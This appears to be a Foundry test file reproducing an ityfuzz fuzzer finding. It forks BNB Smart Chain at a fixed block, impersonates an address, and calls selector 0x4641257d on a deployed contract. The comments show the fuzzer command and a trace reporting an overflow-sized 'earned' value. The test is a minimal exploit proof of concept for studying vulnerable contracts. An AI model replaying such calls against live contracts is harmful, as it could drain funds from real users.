// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0x202b233735bF743FA31abb8f71e641970161bF98,0xa361433E409Adac1f87CDF133127585F8a93c67d,0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE,0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370,0xc30808d9373093fbfcec9e026457c6a9dab706a7,0x34bd6dba456bc31c2b3393e499fa10bed32a9370,0x93c175439726797dcee24d08e4ac9164e88e7aee -c bsc --onchain-block-number 20245522 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 115792089237316195423570985008687907853269984665640564039457584007913129639935000000 more than owed 0, net earned = 115792089237316195423570985008687907853269984665640564039457584007913129639935000000wei (115792089237316195423570985008687907853269984665640564039457ETH)

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0xC30808D9373093fBFCEc9e026457C6a9DaB706a7.call(0x4641257d)
   │  ├─[2] [Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb.fallback()
   │  │  └─ ← ()


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 20245522);
    }

    function test() public {

        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        
        0xC30808D9373093fBFCEc9e026457C6a9DaB706a7.call(abi.encodeWithSignature(
            "4641257d()"
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

